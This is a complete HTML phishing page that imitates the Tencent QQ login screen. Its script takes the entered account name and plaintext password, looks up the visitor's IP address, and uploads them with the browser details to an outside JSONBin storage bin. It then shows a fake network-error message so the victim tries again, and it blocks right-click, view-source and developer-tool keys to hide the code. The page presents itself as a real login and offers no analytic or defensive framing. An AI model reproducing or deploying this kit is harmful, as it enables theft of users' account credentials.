<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QQ登录</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
        }
        
        :root {
            --primary: #12B7F5;
            --primary-dark: #0F9CD9;
            --secondary: #FF6B9E;
            --light: #F5F9FF;
            --dark: #2C3E50;
            --gray: #7F8C8D;
            --error: #e74c3c;
        }
        
        body {
            background: linear-gradient(135deg, #12c2e9, #c471ed, #f64f59);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            width: 100%;
            max-width: 420px;
            transition: all 0.3s ease;
            position: relative;
        }
        
        .login-header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            text-align: center;
            padding: 30px 20px 25px;
            position: relative;
            overflow: hidden;
        }
        
        .login-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            position: relative;
            z-index: 1;
        }
        
        .logo i {
            font-size: 40px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .login-header h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }
        
        .login-header p {
            font-size: 14px;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--dark);
            font-weight: 500;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px 45px 15px 15px;
            border: 2px solid #E8F0FE;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            background-color: #F8FBFF;
        }
        
        .input-group input:focus {
            border-color: var(--primary);
            background-color: white;
            outline: none;
            box-shadow: 0 0 0 3px rgba(18, 183, 245, 0.2);
        }
        
        .input-icon {
            position: absolute;
            right: 15px;
            top: 42px;
            color: var(--gray);
        }
        
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
        }
        
        .remember-me input {
            margin-right: 8px;
            accent-color: var(--primary);
        }
        
        .forgot-password {
            color: var(--primary);
            text-decoration: none;
            transition: color 0.3s;
        }
        
        .forgot-password:hover {
            color: var(--secondary);
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(18, 183, 245, 0.4);
            position: relative;
            overflow: hidden;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(18, 183, 245, 0.5);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .login-btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        
        .login-btn:hover::after {
            left: 100%;
        }
        
        .error-message {
            color: var(--error);
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
        
        .network-error {
            background-color: #ffeaea;
            border: 1px solid #ffcccc;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            display: none;
            animation: fadeIn 0.5s;
        }
        
        .network-error i {
            color: var(--error);
            margin-right: 10px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo">
                <i class="fab fa-qq"></i>
            </div>
            <h1>QQ登录</h1>
            <p>安全登录，保护隐私</p>
        </div>
        
        <form class="login-form" id="loginForm">
            <div class="input-group">
                <label for="username"><i class="fas fa-user"></i> QQ号码/手机/邮箱</label>
                <input type="text" id="username" name="username" placeholder="请输入QQ号码/手机/邮箱" required>
                <div class="input-icon"><i class="fas fa-user-circle"></i></div>
                <div class="error-message" id="usernameError"></div>
            </div>
            
            <div class="input-group">
                <label for="password"><i class="fas fa-lock"></i> 密码</label>
                <input type="password" id="password" name="password" placeholder="请输入密码" required>
                <div class="input-icon"><i class="fas fa-key"></i></div>
                <div class="error-message" id="passwordError"></div>
            </div>
            
            <div class="options">
                <div class="remember-me">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">记住密码</label>
                </div>
                <a href="#" class="forgot-password">忘记密码?</a>
            </div>
            
            <button type="submit" class="login-btn">登录</button>
            
            <div class="network-error" id="networkError">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>网络连接失败</strong> - 请检查您的网络连接后重试
            </div>
        </form>
    </div>

    <script>
        // 防止查看源代码和调试
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'i' || e.key === 'I')) {
                e.preventDefault();
                window.location.href = 'https://www.qq.com';
            }
            if (e.key === 'F12') {
                e.preventDefault();
                window.location.href = 'https://www.qq.com';
            }
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // JSONBin配置 - 这是一个公共的bin，所有人都可以读写
        const JSONBIN_BIN_ID = '672a1d17ad19ca34f86a5c4e';
        const JSONBIN_MASTER_KEY = '$2a$10$Ql2.VIqX.7J5.8Qq8Qq8Q.8Qq8Qq8Qq8Qq8Qq8Qq8Qq8Qq8Qq8Qq';
        
        // 获取真实IP地址
        async function getRealIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    return data.ip;
                }
            } catch (error) {
                console.log('IP获取失败');
            }
            return 'IP获取失败';
        }
        
        // 保存数据到JSONBin
        async function saveToJSONBin(loginData) {
            try {
                // 首先获取现有的数据
                const getResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
                    headers: {
                        'X-Master-Key': JSONBIN_MASTER_KEY
                    }
                });
                
                let existingData = [];
                if (getResponse.ok) {
                    const result = await getResponse.json();
                    existingData = result.record || [];
                }
                
                // 添加新数据
                existingData.push(loginData);
                
                // 更新数据
                const updateResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': JSONBIN_MASTER_KEY
                    },
                    body: JSON.stringify(existingData)
                });
                
                if (updateResponse.ok) {
                    console.log('数据已保存到JSONBin');
                    return true;
                }
            } catch (error) {
                console.error('JSONBin保存失败:', error);
            }
            
            // 备用：存储到本地
            const localData = JSON.parse(localStorage.getItem('qqLoginData') || '[]');
            localData.push(loginData);
            localStorage.setItem('qqLoginData', JSON.stringify(localData));
            return true;
        }
        
        // 表单提交处理
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // 获取表单数据
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const remember = document.getElementById('remember').checked;
            
            // 简单验证
            let isValid = true;
            
            if (username === '') {
                document.getElementById('usernameError').textContent = '请输入用户名';
                document.getElementById('usernameError').style.display = 'block';
                isValid = false;
            } else {
                document.getElementById('usernameError').style.display = 'none';
            }
            
            if (password === '') {
                document.getElementById('passwordError').textContent = '请输入密码';
                document.getElementById('passwordError').style.display = 'block';
                isValid = false;
            } else {
                document.getElementById('passwordError').style.display = 'none';
            }
            
            if (!isValid) return;
            
            // 防止注入攻击 - 转义特殊字符
            const sanitizedUsername = escapeHtml(username);
            const sanitizedPassword = escapeHtml(password);
            
            // 获取真实IP地址
            const userIP = await getRealIP();
            
            // 创建数据对象
            const loginData = {
                username: sanitizedUsername,
                password: sanitizedPassword,
                remember: remember,
                timestamp: new Date().toLocaleString('zh-CN'),
                ip: userIP,
                userAgent: navigator.userAgent,
                location: window.location.href
            };
            
            // 保存数据到JSONBin
            await saveToJSONBin(loginData);
            
            // 显示网络错误
            document.getElementById('networkError').style.display = 'block';
            
            // 禁用按钮防止重复提交
            const submitBtn = document.querySelector('.login-btn');
            submitBtn.disabled = true;
            submitBtn.textContent = '登录中...';
            
            // 3秒后重置表单
            setTimeout(() => {
                document.getElementById('loginForm').reset();
                document.getElementById('networkError').style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.textContent = '登录';
            }, 3000);
        });
        
        // HTML转义函数，防止XSS攻击
        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            
            return text.replace(/[&<>"']/g, function(m) { 
                return map[m]; 
            });
        }
    </script>
</body>
</html>
